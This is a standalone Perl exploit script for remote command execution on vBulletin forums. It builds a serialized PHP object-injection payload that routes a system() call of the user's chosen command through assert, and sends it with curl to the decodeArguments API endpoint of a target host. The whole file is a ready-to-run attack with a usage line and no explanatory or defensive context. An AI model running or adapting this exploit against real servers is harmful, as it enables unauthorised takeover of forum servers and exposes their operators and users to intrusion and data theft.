#!/usr/bin/perl

use strict;
use URI::Escape;

my $host    = $ARGV[0];
my $command = $ARGV[1];

die "usage: perl $0 <host/vBulletin dir> <command>" unless($host and $command);

my $php_cmd = "system('$command')";
my $payload_template = 'O:12:"vB_dB_Result":2:{s:5:"*db";O:17:"vB_Database_MySQL":1:{s:9:"functions";a:1:{s:11:"free_result";s:6:"assert";}}s:12:"*recordset";s:%s:"%s";}';

my $payload = URI::Escape::uri_escape(sprintf($payload_template, length($php_cmd), $php_cmd));
$payload =~ s/%2A/%00%2A%00/gi;

print  qx{curl -s $host/ajax/api/hook/decodeArguments?arguments=$payload};
